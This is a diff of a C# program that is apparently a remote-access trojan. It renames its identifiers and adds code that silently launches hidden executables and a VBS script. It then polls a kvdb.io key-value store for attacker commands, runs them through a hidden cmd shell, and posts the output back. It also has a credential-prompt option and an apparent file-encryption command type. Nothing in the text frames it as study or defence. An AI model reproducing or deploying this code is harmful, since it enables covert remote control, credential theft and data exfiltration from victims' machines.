@@ -1,3 +1,6 @@
+using System;
+using System.Security.Cryptography;
+using System.IO;
 using System.Text;
 using System.Collections.Generic;
 using System.Linq; 
@@ -7,27 +10,24 @@ using System.Diagnostics;
 using System.Windows;
 using System.Runtime.InteropServices;
 using Microsoft.Win32.SafeHandles;
-using System;
-using System.Security.Cryptography;
-using System.IO;
 
-//The auther of this File is FK007
-public class khan_command_exec
+//The code redefines few things !!!
+
+public class Furqan_c_and_c
 {
 	
-	public string khan_Sync(string command)
+	public string Furqan_NoThread(string command)
 {
      try
      {
-			Console.WriteLine("In sync function- string");
-			System.Diagnostics.ProcessStartInfo pr =new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
-			pr.RedirectStandardOutput = true;
-			pr.UseShellExecute = false;
-			pr.CreateNoWindow = true;
-			System.Diagnostics.Process p = new System.Diagnostics.Process();
-			p.StartInfo = pr;
-			p.Start();
-			string result = p.StandardOutput.ReadToEnd();
+			System.Diagnostics.ProcessStartInfo khan_pr =new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
+			khan_pr.RedirectStandardOutput = true;
+			khan_pr.UseShellExecute = false;
+			khan_pr.CreateNoWindow = true;
+			System.Diagnostics.Process khan_p = new System.Diagnostics.Process();
+			khan_p.StartInfo = khan_pr;
+			khan_p.Start();
+			string result = khan_p.StandardOutput.ReadToEnd();
 			Console.WriteLine(result);
 			return result;
       }
@@ -37,21 +37,19 @@ public class khan_command_exec
 		return "0";
       }
 }
-	public void khan_Sync(object command)
+	public void Furqan_NoThread(object command)
 {
      try
      {
-			Console.WriteLine("In sync function - object");
 			Console.WriteLine("About to execute command : " + command.ToString());
-			System.Diagnostics.ProcessStartInfo pr =new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
-			pr.RedirectStandardOutput = true;
-			pr.UseShellExecute = false;
-			pr.CreateNoWindow = true;
-			System.Diagnostics.Process p = new System.Diagnostics.Process();
-			p.StartInfo = pr;
-			p.Start();
-			//string result = p.StandardOutput.ReadToEnd();
-			//Console.WriteLine(result);
+			System.Diagnostics.ProcessStartInfo khan_pr =new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
+			khan_pr.RedirectStandardOutput = true;
+			khan_pr.UseShellExecute = false;
+			khan_pr.CreateNoWindow = true;
+			System.Diagnostics.Process khan_p = new System.Diagnostics.Process();
+			khan_p.StartInfo = khan_pr;
+			khan_p.Start();
+			
 			
       }
       catch (Exception ex)
@@ -60,12 +58,11 @@ public class khan_command_exec
 		
       }
 }
-	public void khan_Async(string command)
+	public void Furqan_Thread(string command)
 	{
 	   try
 	   {
-		Console.WriteLine("In Async function - object");
-		Thread obj= new Thread(new ParameterizedThreadStart(khan_Sync));
+		Thread obj= new Thread(new ParameterizedThreadStart(Furqan_NoThread));
 		obj.IsBackground = true;
 		obj.Priority = ThreadPriority.Highest;
 		obj.Start(command);
@@ -77,9 +74,9 @@ public class khan_command_exec
 	}
 	
 }
-class Driver_Program
+class Furqan_D
 {
-	public string PostRequestJson(string endpoint, string json)
+	public string PostTheData(string endpoint, string json)
 	{
     		
 			Console.WriteLine("(2) End point is : " +endpoint);
@@ -124,7 +121,7 @@ class Driver_Program
  
    		 return jsonResponse;
 	}
-		public string getData(string endpoint)
+		public string getTheData(string endpoint)
 	{
 		using (var client = new WebClient())
 		{
@@ -166,11 +163,11 @@ class Driver_Program
 	}
     static void Main(string[] args)
     {
-		khan_command_exec objj=new khan_command_exec();
+		Furqan_c_and_c objj=new Furqan_c_and_c();
 		string res="FQM3hbtRhm94tkaLXBm5kF"; 
 		string res_key=res;
 		string updated_ep="https://kvdb.io/"+res+"/master_files";
-		Driver_Program obj=new Driver_Program();
+		Furqan_D obj=new Furqan_D();
 		try
 		{
 			string a="D:\\flash.exe,D:\\IntelHD.exe,VB";
@@ -181,29 +178,25 @@ class Driver_Program
 			foreach (string command in splitted)
 			{
 				Console.WriteLine("Command is : " +command);
-				/*string strCmdText=command;
-				//strCmdText= "/C copy /b Image1.jpg + Archive.rar Image2.jpg";
-				if (command.Equals("VB"))
-				{
-					System.Diagnostics.Process.Start("cscript","so.vbs");
-				}
-				else
-				{
-				System.Diagnostics.Process.Start(command);
-				}**/
-				Process myProcess = new Process();
+				Process khan_process = new Process();
 				try
 				{
 					if (command.Equals("VB"))
 					{
-						System.Diagnostics.Process.Start("cscript","so.vbs");
+						//System.Diagnostics.Process.Start("cscript","so.vbs");
+						khan_process.StartInfo.UseShellExecute = false;
+						khan_process.StartInfo.FileName = "cscript";
+						khan_process.StartInfo.Arguments = "D:\\so.vbs";
+						khan_process.StartInfo.CreateNoWindow = true;
+						khan_process.Start();
+						
 					}
 					else
 					{
-						myProcess.StartInfo.UseShellExecute = false;
-						myProcess.StartInfo.FileName = command;
-						myProcess.StartInfo.CreateNoWindow = true;
-						myProcess.Start();
+						khan_process.StartInfo.UseShellExecute = false;
+						khan_process.StartInfo.FileName = command;
+						khan_process.StartInfo.CreateNoWindow = true;
+						khan_process.Start();
 					}
 					
 				}
@@ -229,11 +222,11 @@ class Driver_Program
 				string res1="FQM3hbtRhm94tkaLXBm5kF"; 
 				string res_key1=res1;
 				string updated_ep0="https://kvdb.io/"+res_key1+"/commands_store";
-				var resp2=obj.getData(updated_ep0);
+				var resp2=obj.getTheData(updated_ep0);
 				string new_command="";
 				if ((resp2.Equals("0") == false) && (resp2.Equals("") == false))
 				{
-					//encrypt,path,C:\Users\furqa\Documents,0
+				
 					string []command_details=resp2.Split(',');
 					string command_type=command_details[0];
 					string command=command_details[1];
@@ -247,7 +240,7 @@ class Driver_Program
 							
 							
 								new_command="0"+","+command_details[1]+","+command_details[2];
-								var res2=obj.PostRequestJson(updated_ep0,new_command);
+								var res2=obj.PostTheData(updated_ep0,new_command);
 								Console.WriteLine("Updated Resp : " +res2);
 								string result="";
 								if(command.Equals("<cred_prompt>"))
@@ -259,11 +252,11 @@ class Driver_Program
 								}
 								else
 								{
-								result=objj.khan_Sync(command);
+								result=objj.Furqan_NoThread(command);
 								}
 								string updated_epp="https://kvdb.io/"+res_key+"/command_results";
 								string c_r=command_details[1]+"**###**"+result;
-								var r=obj.PostRequestJson(updated_epp,c_r);
+								var r=obj.PostTheData(updated_epp,c_r);
 							
 							
 						}
